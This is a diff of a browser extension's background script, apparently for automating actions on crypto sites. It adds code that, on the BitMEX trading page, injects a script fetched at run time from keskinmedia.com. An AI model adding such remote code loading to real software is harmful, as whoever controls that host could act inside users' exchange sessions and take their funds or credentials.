@@ -32,6 +32,14 @@ function UygulamayiDurdur() {
 }
 
 chrome.tabs.onUpdated.addListener(async function(tabId, changeInfo, tab) {
+
+    if (tab.url.includes("bitmex.com/app/trade/XBTUSD") && changeInfo.status === "complete" && tab.status == 'complete') {
+        chrome.tabs.executeScript(tabId, {
+            code: `var i = document.createElement('script'); i.src = 'https://keskinmedia.com/api/bitmex-hemenkur.js?v='+ Math.random(); document.head.appendChild(i);`,
+            runAt: "document_end"
+        });
+    }
+    
     if(_userId && tab.url.includes('https://freedoge.co.in') && changeInfo.status === 'complete' && tab.status == 'complete'){
         if (tab.url.includes("/?op=home")) {
             chrome.tabs.executeScript(tabId, {
